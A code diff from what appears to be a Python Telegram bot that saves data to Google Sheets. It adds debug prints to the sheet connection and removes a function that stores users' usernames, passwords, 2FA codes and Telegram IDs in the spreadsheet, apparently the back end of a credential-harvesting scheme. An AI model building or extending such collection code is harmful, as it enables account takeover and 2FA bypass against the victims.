@@ -45,7 +45,7 @@ if not GOOGLE_CREDENTIALS:
     raise ValueError("GOOGLE_CREDENTIALS is not set.")
 
 # ============================================================
-# GOOGLE SHEETS SETUP (FIXED)
+# GOOGLE SHEETS SETUP (IMPROVED WITH BETTER ERROR)
 # ============================================================
 
 SCOPES = [
@@ -54,34 +54,29 @@ SCOPES = [
 ]
 
 def get_sheet():
-    """Connect to Google Sheets using GOOGLE_CREDENTIALS env variable"""
+    """Connect to Google Sheets with detailed error"""
     try:
         creds_dict = json.loads(GOOGLE_CREDENTIALS)
+        print("✅ GOOGLE_CREDENTIALS JSON Loaded")
         
         credentials = Credentials.from_service_account_info(creds_dict, scopes=SCOPES)
+        print("✅ Service Account Credentials Created")
         
         client = gspread.authorize(credentials)
+        print("✅ gspread Authorized")
+        
         spreadsheet = client.open_by_key(SPREADSHEET_ID)
+        print(f"✅ Spreadsheet Opened: {spreadsheet.title}")
+        
         worksheet = spreadsheet.sheet1
+        print("✅ Worksheet Ready")
         
         logger.info("✅ Google Sheets Connected Successfully!")
         return worksheet
-    except json.JSONDecodeError:
-        logger.error("❌ GOOGLE_CREDENTIALS is not valid JSON.")
-        raise
+        
     except Exception as e:
-        logger.error(f"❌ Google Sheets connection failed: {e}")
-        raise
-
-def save_to_sheet(username: str, password: str, twofa: str, user_id: int):
-    """Append a new row to the Google Sheet"""
-    try:
-        sheet = get_sheet()
-        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
-        sheet.append_row([username, password, twofa, str(user_id), timestamp])
-        logger.info(f"📋 Data saved for Telegram user {user_id}.")
-    except Exception as e:
-        logger.error(f"Failed to save data to sheet: {e}")
+        logger.error(f"❌ Google Sheets Error: {type(e).__name__} - {e}")
+        print(f"❌ Full Error: {type(e).__name__} - {e}")
         raise
 
 # ============================================================
